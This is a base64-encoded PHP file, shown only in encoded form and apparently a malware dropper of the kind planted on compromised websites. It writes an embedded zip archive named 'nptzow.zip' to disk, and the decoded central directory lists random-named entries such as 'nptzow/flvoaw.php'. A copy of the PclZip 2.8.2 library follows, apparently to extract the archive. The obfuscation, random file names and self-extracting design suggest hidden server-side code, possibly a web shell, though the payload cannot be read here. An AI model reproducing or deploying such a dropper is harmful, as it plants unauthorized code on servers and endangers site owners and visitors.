FKcm03b05TcVJ5WFlaTjZhM3NWK2ZhbTd3TFk5LzM5djM2cmVtTjVhcnRKeWsxTHpqTWtXRDFyR2tqMXFnQXdBWlZQODVJaE8yS1pLWmNVUXZrY1NRRm1YS3pRZ250QjUwQlZGSWlPQzg1eVFWR2FDazY5bnZLbVZteTFLR082WE04VUJlMFN6N2dMTngrSWZ1Y01qS1pIR3c2UktsdVp2dXpDei9FRE0yWTZONnNSSmYvdVJmWU5zMjRoREM2SFVrclhQVzNKWkgxR3kxNlkwSGt6UTE5czJvNVhFUEdBcXR1b3dKR3FNZ0Z6VUlLUEEyRTA3dTBTK2VtakYzK3V6SG9od0JFaGw5aURtdVFGQ3BnNHVraTk5U3JYbGFoNUpGRndlVXB0QVprZTFMcHhjY3pQbWFSVVZjaHhWc0EwSnhZeUk0NUttQURlcGlwRUhIcEh3RHlQbmk2U1FucVMrZVlpNzRLQUNEbEFBc0ZHWEF6V01xWjduOGpsc0JvbUZrUTNvbmRPQVA5RkVjYW9ROWE4VEV4UDVIenA0Yyt3RUtPT1FSbmlLRG9sN0liK2NGOFR4dFpBTHNaVm1WczBnWUZiemZHQVRBREN6TkFjZ2t2ZHhoRStCaUcwRWNtdndxOXRaVkR0c3h6aStLd0JYd2g1dTJ4a3dDTmNieWFKRDJVaFJFSEZBSUdsQlhwMndiY2pPcXRNeGdWYXJmZEVjS3BpYW0yZkcyaE9mc0pYUVcyQzdSYVFpNXpyZy9LaTlReGpYeXRBSldYczFnSis2cmk5WWs3MnhjZ21aWG5wWEFFZnlDUTdwT1lxd3hPc1BoSkp2ekNtMm16N1I1Z1BNNVlYbFdLSm5hbDZsMU5ZMnpHdWdNWlRpc0x3UG4wVHg1dDZSUGVYbDVpeDVJd1pPUURiaHVYR1VRaHE2ZUgxWXBqWHFlUVNCelZSUkR0VkRPMFE4YXNGcHptcmxvRmNkRHhwMUVLclBJT2xiMEpzY1ZjallveWRtNzNrUHhIV2cvNDJ6TWk1MnRtQ29lZzhnZllRR2N0Y2RONHlaTVFjdWhLVWN4K2JXU0dUY2hJc2VETFZsMGVFVWZjK3Q4RzRNWlU3T3p6ZHZObVVaZVd4ejVhTnNRTjJ3enBMWWhZc1M0Y09UVWI3T0VXM1RCNkFGb0lzMTRSTXk3ZXRPY1daRzFPd01lbk52cUZVZzlLNWJncFhnZ2c4MTQ4aHQ3R3A0TWtzejNHQ1U2NkprSFNEdlh5SE1WTmlNRUhKdWJFSFBweS9kL1JldTdhMnZVV251dytXaHQ5MDN1Tmd3L3FuSjFJTmVsZkoxa3FZL0ljREMvbUNaSGpEanFPQWVra2ptNmZkdlZDRTh5dERzSVpDVkQ5S1ZjSWtRaXhaR0lNU2dDMEkvckt6R0FxLzBZRlluc0lhSk9NRkJDeXk4MUJrR2lmanB5dmNoWXpTajhGRXBUb0xwZG1YSzdFdXE4c0RGVUk0a0NWQS9QVWdxVEtLYzM3cWc0ekxNazRDTDNRdm5oYmErdkltTWlRN0x6SjNaaTZYcmtteGRyWGE2REh1czBXTkhIRjVwZnJyTC9nR2lrSWh6WkdkZGZhOVRyOWFuNVA5WWpLSDBZak14R0QxQVVacWhMNTJndDduRmZTK3V5VS9iYlUxeGFINERnT0NaZERrZkZpREpHZHVibzZBaTlTK011QWlRdk1ueWRETEdicTMweGxjdFRVREdLSEwrZk1nRUhFcVNyRTFkNjZSQTdsM09MS3NRUktWcE8xMWdEb3RDWm42UXdjelJuQytySStjeWduZUsvcTlxSTdqQTlGS2llb1NjMTBKV1BSeVZNZitkT2xWd2owZU9uUWRCSklBOXd5bkJ0UmRreXRvcVdNZXBRY2V2Z1cxdkd2SXFVcmp3VkFSSUluT1lTSVhmUUhWaytNWERFY2lrWXBxL3FVTHpITGE2L3pnQ0JzKzZITmhYMDhNRittM1ZEN29zVVlJeXlkNVgyNzdXOXpYTnAwSU5qRWUwcHJhZmFCWUlKd29OQnQ0K2pkUHVqeHdGYmFFSno0OVpueWZUeXdiTXVCZHhWbjU0YmY5cURrVWNsOVJlY1k4WXFaSDQ2R3B4cmU3bXArZWt2cVRGTkI1bGlyNTlkL1c4OHU2SVZLT20xVVY2emxOMkNVNHRlaFpHUGM5N1BNREZIa2dmem9LUXkzSG5uTEdQemlxUm9jY3NlQUlaM2ozK2dxNTg1NXB3a2Z2NEUrNEw5RWEybExTWkppcFNmYlJnbjUzL2t2NnZ4V1lnNUsyMk1jbGJieW9VVXRzQTJPMnRiWE1tZXN4dkhPZmRDSWk4SHU0NFUrVUR5V0hDN3pVVHhSdGJKWXBzUlo5dnp6eUNhOWVsWmo0cUhFTE96TTlPM2VjNTRJekNPbytXc1IzZnl5Lzh6STk4YVk4c2lnSmIzdVdGeHp5QlRTRmFXSzA3b2tWY3dTUEs4bC9sLzhmQnVDeEVNT0lUNVQyVC9oT3Mzd3cwNWFwQVR0aGt5b1lnNml0Zng4V0t1NkYzVDBPdHo4THRHR0pUSjRROFN5Si94QmwzRFkrNmp5eGM5dnV3NUdrQlE4VmMrNEQ3Z3lqNlk0Q0FMbGFDMzh2OG0zcnI1RnYySWxxa0x5dXZUeTE5OS9QS2YzbnY1ZDcvKy9XZi85dUxkbjg2LytOM3ZYdjNtNmN2MzMvNzYzYWRmZmZqNWkwL2VlZkhwUjEvLzgyY3YvdWJwaTUvLzhxdjMvdVBWMzc3ejZpLy8vZVUvL09Tcjl6Nzk2cU4zNTMvL3llZXYvdlh0bDUvLy9OVXZmdU93TTJtWVJJclhBTzZUWHlGY2ZtdWdJbVNGMUIrOWxZQWY1VkUxeldyNWMvTGF5YUU4Q1VRMWlYc1Y5RDkyc1ZLcExkSGx0d3VGTkRSYXFCS1dGanBMZS9Ka2dPRGIxVGVHNkowRGZqeHd3NExKRjJvZDZGUE9HeWxXRG5BYkJoeXhxeGNycWV5aGJzN1RsSHM3UXBHMGZSMWdPM2k2Y3ZGRXFGU0F2TXlOUDlBOU9KWW1ZalVBOHkxMFVxcTU2U3BHejF1OHhMSHkySll2eTJMbER5cmNENFl5N3RuK1lxVXhVNkZERVdiU25YZ2s0S0ZJZFRqMzNmSVNhTVF2eE03SmJOYkhSVzJhaUFWOXV4d1Y4ZmM1S1ZQMU04MW9UTjdPalJPRlN1Q0pDc1IzeXhWY3IxNFFlMG11RTNFZkJkellnZlB5cEpCaTVISHVCZTFlNkpYTDcxYVd2THZlUWkwZnZXSkNWRmxhU3dkaThDMVRUdnFWcGVXaERrZFRGbXI1MXZtcnNDc0FQWEwvdVVPYnJCT3AwYkhMWDhVbXl6ZE9OQ0w4QnBjWTdKb2lXaGlFWXlDOURQUE8wcCtxUUtYWllZN21pOEZRcUhFT3k3VlFkZEI4REd0M01iSUk2a0pKZVJIUEM4blNGUTRiK1FTTTdzdStEZ09aWWc5aDQxalJRREV2Y25DV0hza0YxNjYyUWlIcjlOZW4vM1g2eWZPM1R6KzdhSmdTVDhYcS9LWXRYM3VDMi8xQlJ4K1BCRFY0UmQ1aG5mNDl5enY5N2ZOM252ODFuWDVJcHgrZi92YjBJK3p6T2Y0K2RIZitncDYvL2Z3ZG5uTDZuNmVmTHRTU00xdC9NMEYxbUc1S0s5T0ZPZnhHVk9hekNzS0p4Qk9OaERMVUp5T3ljZTY1NW5tMG9qWlFnKzFtYmZLOEt4eTJOYjZVa01neU1NZ1NtVDZhdXVxM01HbFhhOHRLMFBtNzdtMTA3a1FQeWFZWHorV0FHazJFZHU1VmJzMzlmeEQvRFZCTEFRSVVBQW9BQUFBQUFKc1JlRXNBQUFBQUFBQUFBQUFBQUFBSEFBQUFBQUFBQUFBQUVBQUFBQUFBQUFCdWNIUjZiM2N2VUVzQkFoUUFGQUFBQUFnQXBSRjRTd2J5b1pDTUNRQUFOUnNBQUJFQUFBQUFBQUFBQVFBZ0FBQUFKUUFBQUc1d2RIcHZkeTltYkhadllYY3VjR2h3VUVzQkFoUUFDZ0FBQUFBQUVSQnpTd0FBQUFBQUFBQUFBQUFBQUE0QUFBQUFBQUFBQUFBUUFBQUE0QWtBQUc1d2RIcHZkeTl6YjNSd2FXVXZVRXNCQWhRQUZBQUFBQWdBdEt4eFM3OHNJM0ZqQXdBQWRnWUFBQk1BQUFBQUFBQUFBUUFnQUFBQURBb0FBRzV3ZEhwdmR5OXpiM1J3YVdVdk1TNTBlSFJRU3dFQ0ZBQVVBQUFBQ0FEaXFYRkxneEhTOFJFRUFBQWxDUUFBRkFBQUFBQUFBQUFCQUNBQUFBQ2dEUUFBYm5CMGVtOTNMM052ZEhCcFpTOHhNaTUwZUhSUVN3RUNGQUFVQUFBQUNBQlVwbkZMUFI4azhNc0VBQURHRFFBQUV3QUFBQUFBQUFBQkFDQUFBQURqRVFBQWJuQjBlbTkzTDNOdmRIQnBaUzgxTG5SNGRGQkxBUUlVQUJRQUFBQUlBRmluY1V2VWFkbWhEd2tBQUhZbUFBQVRBQUFBQUFBQUFBRUFJQUFBQU44V0FBQnVjSFI2YjNjdmMyOTBjR2xsTHpjdWRIaDBVRXNCQWhRQUZBQUFBQWdBaWFoeFM3NXBkSTlGQ1FBQXVSOEFBQk1BQUFBQUFBQUFBUUFnQUFBQUh5QUFBRzV3ZEhwdmR5OXpiM1J3YVdVdk9TNTBlSFJRU3dFQ0ZBQUtBQUFBQUFBSUczUkxBQUFBQUFBQUFBQUFBQUFBRFFBQUFBQUFBQUFBQUJBQUFBQ1ZLUUFBYm5CMGVtOTNMM2QwZFdSekwxQkxBUUlVQUJRQUFBQUlBQ0dYWTBzZGJFcVh1ZzhBQU1vcUFBQVZBQUFBQUFBQUFBRUFJQUFBQU1BcEFBQnVjSFI2YjNjdmQzUjFaSE12WjNKMGFuUjVkV3hRU3dFQ0ZBQVVBQUFBQ0FBSUczUkxEMDY4dTkwUEFBQWFJUUFBRWdBQUFBQUFBQUFCQUNBQUFBQ3RPUUFBYm5CMGVtOTNMM2QwZFdSekwzTmtjMlJuVUVzRkJnQUFBQUFMQUFzQXRBSUFBTHBKQUFBQUFBPT0iKTsgDQpmaWxlX3B1dF9jb250ZW50cygibnB0em93LnppcCIsJGRhdGEpOyANCg0KDQoNCmlmICghZGVmaW5lZCgnUENMWklQX1JFQURfQkxPQ0tfU0laRScpKSB7DQogIGRlZmluZSggJ1BDTFpJUF9SRUFEX0JMT0NLX1NJWkUnLCAyMDQ4ICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX1NFUEFSQVRPUicpKSB7DQogIGRlZmluZSggJ1BDTFpJUF9TRVBBUkFUT1InLCAnLCcgKTsNCn0NCg0KaWYgKCFkZWZpbmVkKCdQQ0xaSVBfRVJST1JfRVhURVJOQUwnKSkgew0KICBkZWZpbmUoICdQQ0xaSVBfRVJST1JfRVhURVJOQUwnLCAwICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX1RFTVBPUkFSWV9ESVInKSkgew0KICBkZWZpbmUoICdQQ0xaSVBfVEVNUE9SQVJZX0RJUicsICcnICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX1RFTVBPUkFSWV9GSUxFX1JBVElPJykpIHsNCiAgZGVmaW5lKCAnUENMWklQX1RFTVBPUkFSWV9GSUxFX1JBVElPJywgMC40NyApOw0KfQ0KDQoNCiRnX3BjbHppcF92ZXJzaW9uID0gIjIuOC4yIjsNCg0KZGVmaW5lKCAnUENMWklQX0VSUl9VU0VSX0FCT1JURUQnLCAyICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX05PX0VSUk9SJywgMCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwnLCAtMSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCcsIC0yICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSJywgLTMgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfTUlTU0lOR19GSUxFJywgLTQgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfRklMRU5BTUVfVE9PX0xPTkcnLCAtNSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9JTlZBTElEX1pJUCcsIC02ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0JBRF9FWFRSQUNURURfRklMRScsIC03ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0RJUl9DUkVBVEVfRkFJTCcsIC04ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0JBRF9FWFRFTlNJT04nLCAtOSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9CQURfRk9STUFUJywgLTEwICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0RFTEVURV9GSUxFX0ZBSUwnLCAtMTEgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfUkVOQU1FX0ZJTEVfRkFJTCcsIC0xMiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9CQURfQ0hFQ0tTVU0nLCAtMTMgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCcsIC0xNCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRScsIC0xNSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRScsIC0xNiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9BTFJFQURZX0FfRElSRUNUT1JZJywgLTE3ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OJywgLTE4ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0VOQ1JZUFRJT04nLCAtMTkgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfSU5WQUxJRF9BVFRSSUJVVEVfVkFMVUUnLCAtMjAgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfRElSRUNUT1JZX1JFU1RSSUNUSU9OJywgLTIxICk7DQoNCmRlZmluZSggJ1BDTFpJUF9PUFRfUEFUSCcsIDc3MDAxICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0FERF9QQVRIJywgNzcwMDIgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEgnLCA3NzAwMyApOw0KZGVmaW5lKCAnUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEgnLCA3NzAwNCApOw0KZGVmaW5lKCAnUENMWklQX09QVF9TRVRfQ0hNT0QnLCA3NzAwNSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklORycsIDc3MDA2ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OJywgNzcwMDcgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQllfTkFNRScsIDc3MDA4ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0JZX0lOREVYJywgNzcwMDkgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQllfRVJFRycsIDc3MDEwICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0JZX1BSRUcnLCA3NzAxMSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9DT01NRU5UJywgNzcwMTIgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQUREX0NPTU1FTlQnLCA3NzAxMyApOw0KZGVmaW5lKCAnUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlQnLCA3NzAxNCApOw0KZGVmaW5lKCAnUENMWklQX09QVF9FWFRSQUNUX0lOX09VVFBVVCcsIDc3MDE1ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVInLCA3NzAxNiApOw0KZGVmaW5lKCAnUENMWklQX09QVF9TVE9QX09OX0VSUk9SJywgNzcwMTcgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT04nLCA3NzAxOSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEJywgNzcwMjAgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OJywgNzcwMjEgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRicsIDc3MDIyICk7DQoNCmRlZmluZSggJ1BDTFpJUF9BVFRfRklMRV9OQU1FJywgNzkwMDEgKTsNCmRlZmluZSggJ1BDTFpJUF9BVFRfRklMRV9ORVdfU0hPUlRfTkFNRScsIDc5MDAyICk7DQpkZWZpbmUoICdQQ0xaSVBfQVRUX0ZJTEVfTkVXX0ZVTExfTkFNRScsIDc5MDAzICk7DQpkZWZpbmUoICdQQ0xaSVBfQVRUX0ZJTEVfTVRJTUUnLCA3OTAwNCApOw0KZGVmaW5lKCAnUENMWklQX0FUVF9GSUxFX0NPTlRFTlQnLCA3OTAwNSApOw0KZGVmaW5lKCAnUENMWklQX0FUVF9GSUxFX0NPTU1FTlQnLCA3OTAwNiApOw0KDQpkZWZpbmUoICdQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QnLCA3ODAwMSApOw0KZGVmaW5lKCAnUENMWklQX0NCX1BPU1RfRVhUUkFDVCcsIDc4MDAyICk7DQpkZWZpbmUoICdQQ0xaSVBfQ0JfUFJFX0FERCcsIDc4MDAzICk7DQpkZWZpbmUoICdQQ0xaSVBfQ0JfUE9TVF9BREQnLCA3ODAwNCApOw0KDQpjbGFzcyBQY2xaaXANCnsNCiAgdmFyICR6aXBuYW1lID0gJyc7DQoNCiAgdmFyICR6aXBfZmQgPSAwOw0KDQogIHZhciAkZXJyb3JfY29kZSA9IDE7DQogIHZhciAkZXJyb3Jfc3RyaW5nID0gJyc7DQogIA0KICB2YXIgJG1hZ2ljX3F1b3Rlc19zdGF0dXM7DQoNCmZ1bmN0aW9uIFBjbFppcCgkcF96aXBuYW1lKQ0Kew0KDQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCdnem9wZW4nKSkNCiAgew0KICAgIGRpZSgnQWJvcnQgJy5iYXNlbmFtZShfX0ZJTEVfXykuJyA6IE1pc3NpbmcgemxpYiBleHRlbnNpb25zJyk7DQogIH0NCg0KICAkdGhpcy0+emlwbmFtZSA9ICRwX3ppcG5hbWU7DQogICR0aGlzLT56aXBfZmQgPSAwOw0KICAkdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyA9IC0xOw0KDQogIHJldHVybjsNCn0NCg0KZnVuY3Rpb24gY3JlYXRlKCRwX2ZpbGVsaXN0KQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICAkdl9vcHRpb25zID0gYXJyYXkoKTsNCiAgJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OXSA9IEZBTFNFOw0KDQogICR2X3NpemUgPSBmdW5jX251bV9hcmdzKCk7DQoNCiAgaWYgKCR2X3NpemUgPiAxKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICBhcnJheV9zaGlmdCgkdl9hcmdfbGlzdCk7DQogICAgJHZfc2l6ZS0tOw0KDQogICAgaWYgKChpc19pbnRlZ2VyKCR2X2FyZ19saXN0WzBdKSkgJiYgKCR2X2FyZ19saXN0WzBdID4gNzcwMDApKSB7DQoNCiAgICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfUkVNT1ZFX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQUREX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfQ0JfUFJFX0FERCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QT1NUX0FERCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT04gPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0NPTU1FTlQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KDQogICAgZWxzZSB7DQoNCiAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF0gPSAkdl9hcmdfbGlzdFswXTsNCg0KICAgICAgaWYgKCR2X3NpemUgPT0gMikgew0KICAgICAgICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdID0gJHZfYXJnX2xpc3RbMV07DQogICAgICB9DQogICAgICBlbHNlIGlmICgkdl9zaXplID4gMikgew0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLA0KCSAgICAgICAgICAgICAgICAgICAgICAgIkludmFsaWQgbnVtYmVyIC8gdHlwZSBvZiBhcmd1bWVudHMiKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQogIA0KICAkdGhpcy0+cHJpdk9wdGlvbkRlZmF1bHRUaHJlc2hvbGQoJHZfb3B0aW9ucyk7DQoNCiAgJHZfc3RyaW5nX2xpc3QgPSBhcnJheSgpOw0KICAkdl9hdHRfbGlzdCA9IGFycmF5KCk7DQogICR2X2ZpbGVkZXNjcl9saXN0ID0gYXJyYXkoKTsNCiAgJHBfcmVzdWx0X2xpc3QgPSBhcnJheSgpOw0KICANCiAgaWYgKGlzX2FycmF5KCRwX2ZpbGVsaXN0KSkgew0KICANCiAgICBpZiAoaXNzZXQoJHBfZmlsZWxpc3RbMF0pICYmIGlzX2FycmF5KCRwX2ZpbGVsaXN0WzBdKSkgew0KICAgICAgJHZfYXR0X2xpc3QgPSAkcF9maWxlbGlzdDsNCiAgICB9DQogICAgDQogICAgZWxzZSB7DQogICAgICAkdl9zdHJpbmdfbGlzdCA9ICRwX2ZpbGVsaXN0Ow0KICAgIH0NCiAgfQ0KDQogIGVsc2UgaWYgKGlzX3N0cmluZygkcF9maWxlbGlzdCkpIHsNCiAgICAkdl9zdHJpbmdfbGlzdCA9IGV4cGxvZGUoUENMWklQX1NFUEFSQVRPUiwgJHBfZmlsZWxpc3QpOw0KICB9DQoNCiAgZWxzZSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgdmFyaWFibGUgdHlwZSBwX2ZpbGVsaXN0Iik7DQogICAgcmV0dXJuIDA7DQogIH0NCiAgDQogIGlmIChzaXplb2YoJHZfc3RyaW5nX2xpc3QpICE9IDApIHsNCiAgICBmb3JlYWNoICgkdl9zdHJpbmdfbGlzdCBhcyAkdl9zdHJpbmcpIHsNCiAgICAgIGlmICgkdl9zdHJpbmcgIT0gJycpIHsNCiAgICAgICAgJHZfYXR0X2xpc3RbXVtQQ0xaSVBfQVRUX0ZJTEVfTkFNRV0gPSAkdl9zdHJpbmc7DQogICAgICB9DQogICAgICBlbHNlIHsNCiAgICAgIH0NCiAgICB9DQogIH0NCiAgDQogICR2X3N1cHBvcnRlZF9hdHRyaWJ1dGVzDQogID0gYXJyYXkgKCBQQ0xaSVBfQVRUX0ZJTEVfTkFNRSA9PiAnbWFuZGF0b3J5Jw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX05FV19TSE9SVF9OQU1FID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9ORVdfRlVMTF9OQU1FID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9NVElNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfQ09OVEVOVCA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfQ09NTUVOVCA9PiAnb3B0aW9uYWwnDQoJCQkJCSk7DQogIGZvcmVhY2ggKCR2X2F0dF9saXN0IGFzICR2X2VudHJ5KSB7DQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZGaWxlRGVzY3JQYXJzZUF0dCgkdl9lbnRyeSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X2ZpbGVkZXNjcl9saXN0W10sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfc3VwcG9ydGVkX2F0dHJpYnV0ZXMpOw0KICAgIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICB9DQoNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZGaWxlRGVzY3JFeHBhbmQoJHZfZmlsZWRlc2NyX2xpc3QsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICByZXR1cm4gMDsNCiAgfQ0KDQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q3JlYXRlKCR2X2ZpbGVkZXNjcl9saXN0LCAkcF9yZXN1bHRfbGlzdCwgJHZfb3B0aW9ucyk7DQogIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgIHJldHVybiAwOw0KICB9DQoNCiAgcmV0dXJuICRwX3Jlc3VsdF9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBhZGQoJHBfZmlsZWxpc3QpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogICR2X29wdGlvbnMgPSBhcnJheSgpOw0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT05dID0gRkFMU0U7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICBpZiAoJHZfc2l6ZSA+IDEpIHsNCiAgICAkdl9hcmdfbGlzdCA9IGZ1bmNfZ2V0X2FyZ3MoKTsNCg0KICAgIGFycmF5X3NoaWZ0KCR2X2FyZ19saXN0KTsNCiAgICAkdl9zaXplLS07DQoNCiAgICBpZiAoKGlzX2ludGVnZXIoJHZfYXJnX2xpc3RbMF0pKSAmJiAoJHZfYXJnX2xpc3RbMF0gPiA3NzAwMCkpIHsNCg0KICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZQYXJzZU9wdGlvbnMoJHZfYXJnX2xpc3QsICR2X3NpemUsICR2X29wdGlvbnMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcnJheSAoUENMWklQX09QVF9SRU1PVkVfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9BRERfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QUkVfQUREID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BPU1RfQUREID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9OT19DT01QUkVTU0lPTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9